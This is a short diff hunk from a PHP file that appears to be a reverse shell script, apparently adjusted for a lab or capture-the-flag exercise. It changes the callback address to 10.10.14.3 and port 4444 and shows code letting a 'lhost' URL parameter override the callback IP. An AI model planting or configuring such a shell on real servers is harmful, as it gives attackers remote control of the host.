@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";   // CHANGE THIS
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;  
+$ip = '10.10.14.3';  // CHANGE THIS
+$port = 4444;  
 
 if (isset($_GET['lhost']) && filter_var($_GET['lhost'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)){
 	$ip = $_GET['lhost'];
